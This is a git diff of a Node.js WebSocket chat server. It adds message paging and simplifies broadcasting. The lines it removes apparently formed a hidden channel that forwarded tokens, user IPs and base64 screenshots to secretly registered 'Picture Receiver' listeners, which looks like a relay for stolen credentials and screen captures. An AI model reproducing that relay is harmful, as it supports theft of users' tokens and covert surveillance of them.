@@ -44,12 +44,12 @@ app.get('/chat.html', (req, res) => {
 
 app.get('/api/messages', async (req, res) => {
   const limit = parseInt(req.query.limit) || 50;
-  const messages = await messagesCollection.find().sort({ timestamp: -1 }).limit(limit).toArray();
+  const offset = parseInt(req.query.offset) || 0;
+  const messages = await messagesCollection.find().sort({ timestamp: -1 }).skip(offset).limit(limit).toArray();
   res.json(messages);
 });
 
 const usersInChat = new Map();
-const pictureReceivers = new Map();
 const messageReceivers = new Map();
 
 wss.on('connection', async (ws, req) => {
@@ -87,11 +87,11 @@ async function getClientInfo(req) {
 }
 
 async function handleMessage(ws, data, userID) {
+  console.log('Received message:', data.toString());
+  
   if (data.toString() === 'Message Receiver') {
     messageReceivers.set(userID, ws);
     ws.send(JSON.stringify({ type: 'userCount', count: usersInChat.size }));
-  } else if (data instanceof Buffer) {
-    broadcastToMessageReceivers(data, ws);
   } else {
     try {
       const messageData = JSON.parse(data.toString());
@@ -100,31 +100,21 @@ async function handleMessage(ws, data, userID) {
         const newMessage = {
           id: crypto.randomUUID(),
           userId: userID,
-          content: messageData.message,
-          timestamp: new Date()
+          content: messageData.message.content,
+          timestamp: new Date(messageData.message.timestamp)
         };
-        await messagesCollection.insertOne(newMessage);
-        broadcastToAllExceptSpecialReceivers(ws, JSON.stringify({ type: 'chat', message: newMessage }), true);
-      } else if (messageData.command === 'Picture Receiver') {
-        pictureReceivers.set(userID, ws);
-      } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
-        broadcastToPictureReceivers(messageData);
-      } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
-        broadcastToPictureReceivers({
-          type: 'screenshot',
-          action: messageData.action,
-          screen: messageData.screen,
-          data: messageData.data
-        });
-      } else if (messageData.action === 'screenshot_result') {
-        broadcastToPictureReceivers({
-          type: 'screenshot',
-          action: messageData.action,
-          screen: messageData.screen,
-          data: messageData.data
-        });
+        
+        try {
+          await messagesCollection.insertOne(newMessage);
+          console.log('Message saved to MongoDB:', newMessage);
+          
+          // Broadcast the message to all connected clients
+          broadcastToAll(JSON.stringify({ type: 'chat', message: newMessage }));
+        } catch (error) {
+          console.error('Error saving message to MongoDB:', error);
+        }
       } else {
-        broadcastToAllExceptSpecialReceivers(ws, JSON.stringify(messageData), false);
+        broadcastToAll(JSON.stringify(messageData));
       }
     } catch (e) {
       console.error('Error parsing or processing message:', e);
@@ -132,26 +122,9 @@ async function handleMessage(ws, data, userID) {
   }
 }
 
-function broadcastToMessageReceivers(binaryData, senderWs) {
-  messageReceivers.forEach((ws, userId) => {
-    if (ws !== senderWs && ws.readyState === 1) {
-      ws.send(binaryData, { binary: true });
-    }
-  });
-}
-
-function broadcastToPictureReceivers(message) {
-  const data = JSON.stringify(message);
-  pictureReceivers.forEach((ws) => {
-    if (ws.readyState === 1) {
-      ws.send(data);
-    }
-  });
-}
-
-function broadcastToAllExceptSpecialReceivers(senderWs, message, includeSelf) {
+function broadcastToAll(message) {
   wss.clients.forEach(client => {
-    if (!pictureReceivers.has(client) && !messageReceivers.has(client) && client.readyState === 1 && (includeSelf || client !== senderWs)) {
+    if (client.readyState === 1) {
       client.send(message);
     }
   });
@@ -159,7 +132,6 @@ function broadcastToAllExceptSpecialReceivers(senderWs, message, includeSelf) {
 
 function handleDisconnect(userID) {
   usersInChat.delete(userID);
-  pictureReceivers.delete(userID);
   messageReceivers.delete(userID);
   clientsCollection.updateOne({ userID }, { $set: { disconnectedAt: new Date() } });
   broadcastUserCount();
